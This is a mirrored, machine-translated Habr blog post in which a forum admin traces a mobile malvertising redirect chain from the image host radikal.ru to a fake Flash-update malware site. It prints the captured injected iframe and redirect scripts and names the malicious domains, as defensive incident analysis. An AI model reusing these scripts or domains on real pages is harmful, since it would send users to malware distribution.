<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Viruses with a radical. Again!</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The story began with a text message ‚Äúurgently go on Skype‚Äù - the client wrote, the owner of one of the sites, which I help in ensuring the viability o...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Viruses with a radical. Again!</h1><div class="post__text post__text-html js-mediator-article">  The story began with a text message ‚Äúurgently go on Skype‚Äù - the client wrote, the owner of one of the sites, which I help in ensuring the viability of this site itself.  It turned out that he received a letter from a certain Alexander Goryachev with the statement that the site was most likely infected. <br><a name="habracut"></a><br>  Here is the text of the letter: <br><br><blockquote>  Hello. <br><br>  My name is Alexander Goryachev, I am an analyst at Doctor Web. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      There is information that when opening images in this topic, yarportal.ru/topic324608s0.html on the form yarportal.ru is redirected from the hosting site radikal.ru to a fraudulent website that distributes mobile malwares under the guise of software updates.  That is, if you are using a mobile device (phone, smartphone), the first open page radikal.ru with the right image, but then almost immediately a redirect to a fraudulent site (for example - newbrwzer.com/?a=u264w264z413x4u2w4x2t2v2y3u2x494q233c4y2b4w26413).  If you open images directly on the hosting itself, without an intermediate link in the face of yarportal.ru, this behavior is not observed.  Perhaps, yarportal.ru was hacked or it uses an unfair advertising model, which the portal owners may not be aware of. <br><br>  From the contact information the most appropriate was yours, so it was decided to report on it.  Can you somehow comment on the situation and address this issue?  We would be grateful if you can provide any information. <br><br>  Thank. </blockquote><br><br>  The site is a fairly large forum, respectively, users post pictures anywhere, and then put there links in the form that shows them kartinkoohosting.  The radical, alas, is one of the most popular. <br><br>  I tried to repeat the analyst‚Äôs actions and scan the traffic that goes to the mobile device.  Indeed, a redirect to this newbrwzer occurs, but it‚Äôs not quite clear what our site is about.  An analysis of traffic has shown that the malicious link itself is given by the radical itself in a manner similar to the following: <br><br><pre><code class="html hljs xml">$ curl -s http://radikal.ru/F/s45.radikal.ru/i107/1205/76/593cc990c6ae.jpg.html | grep adv-port <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="xml"><span class="xml">document.write('</span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">border</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">marginwidth</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">marginheight</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"http://adv-port.com/view2.php?title='+document.title+'&amp;referrer='+document.referrer+'&amp;lang='+navigator.language+'"</span></span></span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"120"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"240"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml">');</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  Further it sends the browser to the page of the form: <br><pre> <code class="html hljs xml">http://adv-port.com/view2.php?title=%D0%A0%D0%B0%D0%B4%D0%B8%D0%BA%D0%B0%D0%BB-%D0%A4%D0%BE%D1%82%D0%BE%20::%20%D0%A3%D0%B2%D0%B5%D0%BB%D0%B8%D1%87%D0%B5%D0%BD%D0%BD%D0%BE%D0%B5%20%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5&amp;referrer=http://yarportal.ru/topic324608s0.html&amp;lang=en</code> </pre> <br><br>  Where the following code occurs: <br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://adv-port.com/ctr.php?ref='+document.referrer+'"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  The link <a href="http://adv-port.com/ctr.php%3Fref%3D">adv-port.com/ctr.php?ref=</a> '+ document.referrer +' has the following code: <br><pre> <code class="html hljs xml">function error() { top.location='http://network-sitead.com/'; }</code> </pre> <br><br>  This link has the following code: <br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'http://on-line-adv.com/2.php'</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  Downloading this link produces the following: <br><pre> <code class="html hljs xml">document.location='http://newbrwzer.com/?a=u264w264z413x4u2w4x2t2v2y3u2x494q233c4y2b4w26413'</code> </pre> <br><br>  Those.  In the end, the browser really gets on the page with the offer to "update" the flash player.  A little later, it turned out that some users really "update" it: <a href="http://yarportal.ru/topic332505.html">yarportal.ru/topic332505.html</a> <br><br>  Following the results of this ‚Äúinvestigation‚Äù 3 questions arise: <br><ol><li>  When will the radical die with this kind of advertising policy?  This is not the first case of the spread of viruses through them. </li><li>  Where do analysts who do not bother to look at traffic via wireshark / tcpdump take analysts to Dr.Web? </li><li>  Or maybe it's just I'm a fool and the site is really infected?  :) </li></ol><br><br>  PS: The analyst is indeed related to Dr.Web, his article is on the habre in office.  a blog company <a href="http://habrahabr.ru/company/drweb/blog/142993/">habrahabr.ru/company/drweb/blog/142993</a> <br><br>  UPD: do not use the radical - this, of course, a great idea, it is a pity, very close to utopia.  Much more interesting is why there are regularly viruses there, and how many more of the same ‚Äúupdates‚Äù managed to be delivered from this site, the audience at the radical hoo) <br><br>  UPD2: no need to offer alternatives to the radical, I already know them, thank you. </div><p>Source: <a href="https://habr.com/ru/post/144819/">https://habr.com/ru/post/144819/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../144811/index.html">IPMI vulnerability in shell v. 1.00 allowing to reboot the server</a></li>
<li><a href="../144813/index.html">VK notifer on java</a></li>
<li><a href="../144815/index.html">Hacked Bitcoinica site did not have backups</a></li>
<li><a href="../144816/index.html">Facebook buys Opera?</a></li>
<li><a href="../144817/index.html">Easy way or 0 Step Checkout in Magento</a></li>
<li><a href="../144820/index.html">Taxes in the USA. Part 1. Introduction, income tax, federal tax, state tax, Social Security taxes</a></li>
<li><a href="../144821/index.html">OASIS standardizes the open OData protocol</a></li>
<li><a href="../144822/index.html">RDP (non) thin client with Linux based on Nettopes (Nvidia ION, Intel Atom)</a></li>
<li><a href="../144823/index.html">How WarCraft 3 helped me in programming</a></li>
<li><a href="../144824/index.html">Release Notepad ++ 6.1.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>